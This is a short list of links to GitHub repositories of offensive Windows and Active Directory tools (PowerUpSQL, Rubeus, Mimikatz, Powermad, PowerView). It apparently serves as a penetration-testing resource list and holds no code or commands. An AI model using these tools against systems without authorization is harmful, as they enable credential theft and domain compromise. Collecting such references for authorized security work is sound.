[PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)

[Rubeus](https://github.com/GhostPack/Rubeus)

[MimiKatz](https://github.com/ParrotSec/mimikatz)

[Powermad](https://github.com/Kevin-Robertson/Powermad)

[PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
